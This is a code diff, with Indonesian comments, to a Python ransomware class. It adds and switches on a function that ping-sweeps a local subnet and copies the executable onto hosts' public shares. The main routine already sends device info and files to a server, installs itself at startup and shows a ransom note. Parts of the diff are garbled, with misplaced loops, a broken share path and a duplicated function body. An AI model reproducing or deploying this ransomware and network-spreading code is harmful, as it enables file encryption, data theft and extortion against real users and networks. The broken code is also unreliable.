@@ -101,7 +101,32 @@ class RansomWare:
         except Exception as e:
             print(f"[!] Gagal menyebar ke Startup folder: {e}")
 
-    
+    def spread_to_network_hosts(self, local_file="RansomWare.exe"):
+        import ipaddress
+        import subprocess
+        import shutil
+
+        subnet = "192.168.1.0/24"
+        ip_net = ipaddress.ip_network(subnet, strict=False)
+        shared_path_template = r"\{ip}\Users\Public"  # Folder publik di Windows
+
+        for ip in ip_net.hosts():
+            try:
+                result = subprocess.run(
+                    ["ping", "-n" if os.name == "nt" else "-c", "1", str(ip)],
+                    stdout=subprocess.DEVNULL,
+                )
+                if result.returncode == 0:
+                    target_path = shared_path_template.format(
+                        ip=ip, file=os.path.basename(local_file)
+                    )
+                    try:
+                        shutil.copy(local_file, target_path)
+                        print(f"[+] File berhasil disebar ke: {target_path}")
+                    except Exception as e:
+                        print(f"[-] Gagal meng-copy ke {ip}: {e}")
+            except Exception as e:
+                continue
 
     def __init__(self):
         # Key that will be used for Fernet object and encrypt/decrypt method
@@ -317,8 +342,98 @@ class RansomWare:
                         ):
                             self.encrypt_file(file_path)
 
-        
-    def change_desktop_background(self, image_source=None):
+        # Deteksi host lain di jaringan lokal (simulasi edukatif)
+        import ipaddress
+        import subprocess
+
+        try:
+            subnet = "192.168.1.0/24"
+            ip_net = ipaddress.ip_network(subnet, strict=False)
+            active_ips = []
+            for ip in ip_net.hosts():
+                result = subprocess.run(
+                    ["ping", "-n" if os.name == "nt" else "-c", "1", str(ip)],
+                    stdout=subprocess.DEVNULL,
+                )
+                if result.returncode == 0:
+                    active_ips.append(str(ip))
+            if active_ips:
+                print(f"> Ditemukan host aktif di jaringan lokal: {active_ips}")
+            else:
+                print("> Tidak ditemukan host aktif lain di jaringan.")
+        except Exception as e:
+            print(f"> Gagal scan jaringan: {e}")
+
+            for root, _, files in os.walk(folders_path):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    if os.path.isdir(file_path):
+                        continue
+                    if encrypted:
+                        if not file_path.endswith(self.encrypted_extension):
+                            continue
+                    else:
+                        if not any(
+                            file.lower().endswith(f".{ext}") for ext in self.file_exts
+                        ):
+                            continue
+                    try:
+                        self.crypt_file(file_path, encrypted)
+                    except Exception as e:
+                        print(f"> Error processing {file_path}: {str(e)}")
+
+    
+def change_desktop_background(self, image_source=None):
+    import os
+    import requests
+    import ctypes
+    import platform
+
+    try:
+        default_url = "https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg"
+        image_url = image_source or default_url
+
+        bg_path = os.path.abspath(os.path.join(self.sysRoot, "Desktop", "background.jpg"))
+
+        # Unduh gambar jika dari URL
+        if image_url.startswith("http"):
+            try:
+                print("> Mengunduh gambar dari URL...")
+                r = requests.get(image_url, verify=False, timeout=10)
+                with open(bg_path, "wb") as f:
+                    f.write(r.content)
+                print("> Gambar berhasil diunduh.")
+            except Exception as e:
+                print(f"> ERROR download: {e}")
+                return
+        else:
+            if not os.path.exists(image_url):
+                print(f"> ERROR: File tidak ditemukan: {image_url}")
+                return
+            with open(image_url, "rb") as src, open(bg_path, "wb") as dst:
+                dst.write(src.read())
+            print("> Gambar lokal disalin.")
+
+        # Ubah wallpaper
+        if os.name == "nt":
+            SPI_SETDESKWALLPAPER = 20
+            result = ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, bg_path, 3)
+            if result:
+                print("> Wallpaper berhasil diubah di Windows.")
+            else:
+                print("> Gagal mengubah wallpaper di Windows.")
+        elif os.name == "posix":
+            # Linux GNOME
+            cmd = f"gsettings set org.gnome.desktop.background picture-uri 'file://{bg_path}'"
+            os.system(cmd)
+            print("> Wallpaper berhasil diubah di GNOME.")
+        else:
+            print("> Sistem tidak dikenali, tidak bisa ubah wallpaper.")
+
+    except Exception as e:
+        print(f"> ERROR saat ubah wallpaper: {e}")
+
+
 
         try:
             default_url = "https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg"
@@ -579,7 +694,7 @@ def main():
     rw.send_device_info(SERVER_URL, API_TOKEN)
     rw.collect_and_send_files(SERVER_URL, API_TOKEN)
     rw.deploy_to_startup(script_path=sys.argv[0])
-    #rw.spread_to_network_hosts(local_file=sys.argv[0])
+    rw.spread_to_network_hosts(local_file=sys.argv[0])
     t1 = threading.Thread(target=rw.show_ransom_note)
     t2 = threading.Thread(target=rw.put_me_on_desktop)
 
@@ -597,3 +712,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
